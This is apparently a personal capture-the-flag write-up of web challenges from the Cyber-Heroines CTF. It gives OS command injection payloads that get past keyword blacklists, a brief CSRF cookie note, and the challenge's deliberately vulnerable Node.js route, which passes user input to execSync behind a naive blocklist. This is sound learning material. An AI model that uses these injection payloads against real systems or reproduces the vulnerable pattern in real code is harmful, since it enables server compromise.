# WEB
## Grace Hopper
#os-command-injection 
There is os command injection on the site:
![[CTF/Cyber-Heroines/IMG/Pasted image 20230921220938.png]]
but some commands are blocked:
![[CTF/Cyber-Heroines/IMG/Pasted image 20230921221024.png]]
appears to be black-listing , so we'll try every possible way in the: `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection`
This seems to work:
![[CTF/Cyber-Heroines/IMG/Pasted image 20230921221131.png]]
![[CTF/Cyber-Heroines/IMG/Pasted image 20230921221223.png]]
![[CTF/Cyber-Heroines/IMG/Pasted image 20230921221305.png]]
payload:
```
ca$()t$()%20cyberheroines.txt
```

```
FLAG="CHCTF{t#!$_!s_T#3_w@Y}"
echo -n "$FLAG" | sha256sum > cyberheroines.txt
```
## Susan Landau
#csrf
![[CTF/Cyber-Heroines/IMG/Pasted image 20230922005346.png]]

When we login with any name on the site then explore further and choose the "hard way":
![[CTF/Cyber-Heroines/IMG/Pasted image 20230922004135.png]]
Ginger-bread cookie means cookie , csrf had this md5 value on which it said:
![[CTF/Cyber-Heroines/IMG/Pasted image 20230922004106.png]]

## Radia PErlman
#os-command-injection #javascript-vulnerability
![[CTF/Cyber-Heroines/IMG/Pasted image 20230922010746.png]]
look at the error:
![[CTF/Cyber-Heroines/IMG/Pasted image 20230922011240.png]]
shows us the exact command being used at back-end
while all the other weren't working this payload worked:
```
https://cyberheroines-web-srv3.chals.io/dns?ip=8.8.8.8;ca%27t%27%20flag.txt
```
due to the fact that there must be a blacklist updated used to this as the above payload weren't working while the quotations worked!
![[CTF/Cyber-Heroines/IMG/Pasted image 20230922011611.png]]
other solves: `grep chctf flag.txt` , `strings flag.txt`
### VULNERABILITY:

- The `child_process` module in Node.js enables the execution of system commands and scripts within a Node.js application.
- Functions such as `child_process.exec()` and `child_process.execSync()` accept a command string and execute it on the server.
- However, when user input is directly incorporated into these functions, it can create vulnerabilities susceptible to command injection.

### vuln code:
```js
const express = require('express');
const path = require('path');
const cp = require('child_process');

const app = express();

// Serve static files from the 'public' folder
app.use(express.static('public'));

// Configure views folder and view engine as 'hbs'
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'hbs');

// Define routes for different pages

// Home page route
app.get('/', (req, res) => {
  res.render('index');
});

// About page route
app.get('/about', (req, res) => {
  res.render('about');
});

// Contact page route
app.get('/contact', (req, res) => {
  res.render('contact');
});

// Vulnerable DNS route
app.get('/dns', (req, res) => {
  const ip = req.query.ip;

  // Check if the input IP is safe
  if (isSafeInput(ip)) {
    try {
      // Execute 'nslookup' command and capture the output
      const commandOutput = cp.execSync(`nslookup ${ip} 2>&1`).toString();
      res.send('Command Output: ' + commandOutput);
    } catch (error) {
      res.send('Error: ' + error.message);
    }
  } else {
    res.send('Nope. You have to try harder!');
  }
});

// Check for unsafe input (e.g., unsafe keywords except "head")
function isSafeInput(input) {
  const unsafeKeywords = [
    "cat", "tail", "less", "more", "awk", "&&", "head", "|", "$", "`", "<", ">", "&", "*"
  ];
  return !unsafeKeywords.some(keyword => input.includes(keyword)) || input === "head";
}

// Start the server and listen on port 3000
app.listen(3000, () => {
  console.log('Server listening on port 3000');
});
```

## Shafrira Goldwasser
